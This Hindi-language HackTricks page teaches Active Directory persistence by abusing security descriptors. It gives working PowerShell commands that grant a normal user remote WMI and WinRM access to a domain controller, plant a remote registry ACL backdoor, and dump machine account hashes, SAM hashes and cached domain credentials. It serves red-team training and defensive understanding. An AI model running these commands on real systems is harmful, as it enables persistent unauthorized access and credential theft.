# सुरक्षा विवरणक

<details>

<summary><strong> AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) को **फॉलो करें**.
* **अपनी हैकिंग ट्रिक्स साझा करें, HackTricks** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके.

</details>

## सुरक्षा विवरणक

सुरक्षा विवरणक परिभाषा भाषा (SDDL) वह प्रारूप निर्धारित करती है जिसका उपयोग सुरक्षा विवरणक का वर्णन करने के लिए किया जाता है। SDDL DACL और SACL के लिए ACE स्ट्रिंग्स का उपयोग करती है:: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`

**सुरक्षा विवरणक** का उपयोग **अनुमतियों** को **संग्रहित** करने के लिए किया जाता है जो एक **ऑब्जेक्ट** के **ऊपर** एक **ऑब्जेक्ट** के पास होती हैं। यदि आप किसी ऑब्जेक्ट के **सुरक्षा विवरणक** में **थोड़ा बदलाव** कर सकते हैं, तो आप उस ऑब्जेक्ट पर बहुत रोचक विशेषाधिकार प्राप्त कर सकते हैं बिना विशेषाधिकार समूह के सदस्य होने की आवश्यकता के।

इस प्रकार, यह स्थायित्व तकनीक कुछ विशेष ऑब्जेक्ट्स के खिलाफ आवश्यक हर विशेषाधिकार प्राप्त करने की क्षमता पर आधारित है, ताकि व्यवस्थापक विशेषाधिकारों की आवश्यकता के बिना एक कार्य को करने में सक्षम हो सकें।

### WMI तक पहुँच

आप एक उपयोगकर्ता को **इसका उपयोग करके दूरस्थ रूप से WMI निष्पादित करने की अनुमति दे सकते हैं** [**इसका उपयोग करके**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### WinRM तक पहुँच

**winrm PS console तक एक उपयोगकर्ता को पहुँच प्रदान करें** [**इसका उपयोग करके**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### रिमोट हैश तक पहुँच

**रजिस्ट्री** तक पहुँचें और **हैश डंप** करें, [**DAMP**](https://github.com/HarmJ0y/DAMP) का उपयोग करके **रेज बैकडोर** बनाएं, ताकि आप किसी भी समय **कंप्यूटर का हैश**, **SAM** और कंप्यूटर में कोई भी **कैश्ड AD** क्रेडेंशियल प्राप्त कर सकें। इसलिए, यह एक **सामान्य उपयोगकर्ता को डोमेन कंट्रोलर कंप्यूटर के खिलाफ** यह अनुमति देने के लिए बहुत उपयोगी है:
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
```markdown
[**Silver Tickets**](silver-ticket.md) की जाँच करें ताकि आप सीख सकें कि कैसे आप एक Domain Controller के कंप्यूटर अकाउंट के हैश का उपयोग कर सकते हैं।

<details>

<summary><strong> AWS हैकिंग सीखें शून्य से लेकर हीरो तक </strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** 🐦 पर मुझे **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>
```
